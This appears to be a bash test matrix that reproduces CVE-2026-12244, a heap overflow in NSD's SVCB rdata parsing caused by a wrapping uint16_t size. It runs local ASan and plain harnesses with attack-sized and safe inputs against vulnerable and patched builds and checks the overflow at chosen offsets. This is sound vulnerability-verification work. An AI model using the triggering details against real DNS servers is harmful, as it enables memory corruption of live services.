#!/bin/bash
# nsdsvcb2shell CVE-2026-12244 staged reproduction matrix.
# All execution is local: direct sink harness, no sockets and no external
# probes. Vulnerable = NSD 4.14.2, fixed = 4.14.2 + vendor one-line patch.
set -uo pipefail
D="$(cd "$(dirname "$0")" && pwd)"
R="$D/runs"
mkdir -p "$R"
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf 'FAIL %s\n' "$1"; }
has() { if grep -Eq -- "$2" "$1" 2>/dev/null; then ok "$3"; else bad "$3"; fi; }
hasnt() { if grep -Eq -- "$2" "$1" 2>/dev/null; then bad "$3"; else ok "$3"; fi; }

if [ ! -x "$D/harness-vuln-asan" ] || [ ! -x "$D/harness-patched-asan" ] \
   || [ ! -x "$D/harness-vuln-plain" ]; then
    bash "$D/bootstrap.sh" >/dev/null || { echo 'FAIL bootstrap'; exit 1; }
fi

echo '=== pins ==='
for spec in \
  'vuln.tar.gz:2bff57349841844d7560e76d7bd70b6bd6f4c462cdaa6d57b8e83d1e14dd22d6' \
  'fixed.tar.gz:9629ad64d9c1b019bbe22296d5148d7ae65f588ce265a6424750740f052bb12b' \
  'fix.patch:6d145e23945777a077149e045fc6ac1f76c25d8c3d55fac9bb71a3734aa436d1'; do
    f="${spec%%:*}"; want="${spec##*:}"
    got=$(sha256sum "$D/pins/$f" | cut -d' ' -f1)
    if [ "$got" = "$want" ]; then ok "pin $f sha256"; else bad "pin $f sha256 got $got"; fi
done
has "$D/vuln/rdata.c" 'uint16_t size;' 'vulnerable sink uses uint16_t size'
has "$D/patched/rdata.c" 'size_t size;' 'patched sink uses size_t size'
has "$D/fixed/rdata.c" 'size_t size;' 'official 4.14.3 uses size_t size'

echo '=== ASan direct-sink differential ==='
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
(cd "$D" && ./harness-vuln-asan 65512 65 >"$R/vuln-asan-attack.out" 2>&1); va=$?
[ "$va" -ne 0 ] && ok 'vulnerable ASan attack rc!=0' || bad 'vulnerable ASan attack rc'
has "$R/vuln-asan-attack.out" 'WRITE of size 65509' 'ASan WRITE of size 65509'
has "$R/vuln-asan-attack.out" 'read_svcb_rdata .*rdata.c:3317' 'ASan sink frame rdata.c:3317'
has "$R/vuln-asan-attack.out" '0 bytes after 4096-byte region' 'ASan 4096-byte region boundary'
has "$R/vuln-asan-attack.out" 'region_create .*region-allocator.c:135' 'ASan region_create allocation frame'
has "$R/vuln-asan-attack.out" 'uint16_size=7' 'uint16 size wraps to 7'
(cd "$D" && ./harness-vuln-asan 512 65 >"$R/vuln-asan-safe.out" 2>&1); vs=$?
[ "$vs" -eq 0 ] && ok 'vulnerable ASan safe rc=0' || bad 'vulnerable ASan safe rc'
hasnt "$R/vuln-asan-safe.out" 'AddressSanitizer' 'vulnerable safe input ASan-clean'
(cd "$D" && ./harness-patched-asan 65512 65 >"$R/patched-asan-attack.out" 2>&1); pa=$?
[ "$pa" -eq 0 ] && ok 'patched ASan attack rc=0' || bad 'patched ASan attack rc'
hasnt "$R/patched-asan-attack.out" 'AddressSanitizer' 'patched attack ASan-clean'
has "$R/patched-asan-attack.out" 'rc=65512' 'patched attack returns rdlength'
(cd "$D" && ./harness-patched-asan 512 65 >"$R/patched-asan-safe.out" 2>&1); ps=$?
[ "$ps" -eq 0 ] && ok 'patched ASan safe rc=0' || bad 'patched ASan safe rc'
hasnt "$R/patched-asan-safe.out" 'AddressSanitizer' 'patched safe input ASan-clean'

echo '=== plain chosen-byte offsets ==='
unset ASAN_OPTIONS
for seed in 65 90; do
    out="$R/vuln-plain-verify-$seed.out"
    NSD_SVCB_VERIFY=1 ./harness-vuln-plain 65512 "$seed" >"$out" 2>&1; rc=$?
    [ "$rc" -eq 0 ] && ok "plain chosen-byte seed $seed rc=0" || bad "plain chosen-byte seed $seed rc"
    if [ "$seed" -eq 65 ]; then want='10 41 11 42 100 9b 4096 37 8192 37 16384 37 32768 37 65508 1b'
    else want='10 5a 11 5b 100 b4 4096 50 8192 50 16384 50 32768 50 65508 34'; fi
    set -- $want
    while [ $# -ge 2 ]; do
        off=$1; byte=$2; shift 2
        has "$out" "offset=$off got=0x$byte want=0x$byte MATCH" "seed $seed offset $byte at $off"
    done
done
./harness-vuln-plain 512 65 >"$R/vuln-plain-safe.out" 2>&1; rc=$?
[ "$rc" -eq 0 ] && ok 'plain safe input rc=0' || bad 'plain safe input rc'

echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
